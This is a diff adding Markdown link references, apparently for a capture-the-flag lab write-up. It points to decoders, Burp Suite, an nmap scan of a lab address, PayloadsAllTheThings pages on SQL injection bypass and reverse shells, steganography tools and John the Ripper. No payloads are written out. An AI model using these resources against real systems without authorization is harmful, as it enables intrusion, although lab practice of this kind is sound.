+[blockchain-transaction]: https://www.blockchain.com/btc/tx/4dc1213675daf6f2599723e26dbcd136f06463e45ae88c4a9553574b52dd4c82
+[rapidtables]: https://www.rapidtables.com/convert/number/hex-to-ascii.html
+[cyberchef]: https://gchq.github.io/CyberChef
+[explainshell]: https://explainshell.com/explain?cmd=nmap+-sC+-sV+-oA+bountyhounter+10.10.11.100
+[burp]: https://portswigger.net/burp/communitydownload
+[sqli-payloads]: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass
+[reverseshells]: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+[steghide]: http://steghide.sourceforge.net/
+[stegsolve]: https://wiki.bi0s.in/steganography/stegsolve/
+[jstego]: https://github.com/kumarmah/JStego
+[stegoveritas]: https://github.com/bannsec/stegoVeritas
+[redbull]: https://www.redbull.com/us-en/max-verstappen-f1-kitzbuhel-pov-video
+[uncompyle6]: https://pypi.org/project/uncompyle6/
+[jtr]: https://www.openwall.com/john/
